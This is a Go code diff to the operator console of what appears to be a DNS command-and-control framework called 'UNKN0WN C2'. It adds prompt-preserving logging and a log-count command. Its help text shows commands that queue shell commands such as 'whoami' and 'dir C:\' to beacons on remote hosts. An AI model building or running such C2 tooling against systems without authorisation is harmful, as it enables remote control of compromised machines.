@@ -3,15 +3,75 @@ package main
 import (
 	"bufio"
 	"fmt"
+	"log"
 	"os"
 	"strings"
+	"sync"
 	"time"
 )
 
+// Console state management
+var (
+	consoleMutex  sync.Mutex
+	consoleActive bool
+	logCounter    int
+)
+
+// ConsoleLogger wraps the standard logger to preserve console input
+type ConsoleLogger struct {
+	*log.Logger
+}
+
+// Printf prints a log message while preserving the console input line
+func (cl *ConsoleLogger) Printf(format string, v ...interface{}) {
+	if !consoleActive {
+		// If console isn't active, use normal logging
+		cl.Logger.Printf(format, v...)
+		return
+	}
+
+	consoleMutex.Lock()
+	defer consoleMutex.Unlock()
+
+	logCounter++
+
+	// Print a separator line and the log message
+	fmt.Printf("\n--- Log #%d ---\n", logCounter)
+	cl.Logger.Printf(format, v...)
+	fmt.Println("------")
+	fmt.Print("c2> ")
+}
+
+// Global console logger instance
+var consoleLogger *ConsoleLogger
+
+// initConsoleLogger initializes the console-aware logger
+func initConsoleLogger() {
+	consoleLogger = &ConsoleLogger{
+		Logger: log.New(os.Stdout, "", log.LstdFlags),
+	}
+}
+
+// logf is a convenience function for console-aware logging
+func logf(format string, v ...interface{}) {
+	if consoleLogger != nil {
+		consoleLogger.Printf(format, v...)
+	} else {
+		log.Printf(format, v...)
+	}
+}
+
+// startC2Console starts an interactive console for C2 management
 // startC2Console starts an interactive console for C2 management
 func startC2Console() {
-	fmt.Println("\n=== DNS C2 Management Console ===")
+	// Initialize console logging
+	initConsoleLogger()
+
+	fmt.Println("\n=== UNKN0WN C2 Management Console ===")
 	fmt.Println("Type 'help' for available commands")
+
+	consoleActive = true
+	defer func() { consoleActive = false }()
 
 	scanner := bufio.NewScanner(os.Stdin)
 
@@ -23,6 +83,7 @@ func startC2Console() {
 		}
 
 		input := strings.TrimSpace(scanner.Text())
+
 		if input == "" {
 			continue
 		}
@@ -68,6 +129,16 @@ func startC2Console() {
 		case "clear":
 			// Clear screen (simple version)
 			fmt.Print("\033[2J\033[H")
+			// Reset log counter since screen is cleared
+			consoleMutex.Lock()
+			logCounter = 0
+			consoleMutex.Unlock()
+
+		case "logs":
+			consoleMutex.Lock()
+			count := logCounter
+			consoleMutex.Unlock()
+			fmt.Printf("Total log messages since start/clear: %d\n", count)
 
 		case "exit", "quit":
 			fmt.Println("Exiting C2 console...")
@@ -90,13 +161,17 @@ Available Commands:
   tasks                - List all tasks and their status
   task <id> <cmd>      - Queue a command for a specific beacon
   result <task_id>     - Show result of a completed task
-  clear                - Clear screen
+  logs                 - Show count of log messages since start/clear
+  clear                - Clear screen and reset log counter
   exit, quit           - Exit console
 
 Examples:
   task a1b2 whoami
   task a1b2 dir C:\
   result T1001
+
+Note: Log messages appear between markers while you type.
+      Your input is preserved - continue typing after logs appear.
 
 `)
 }
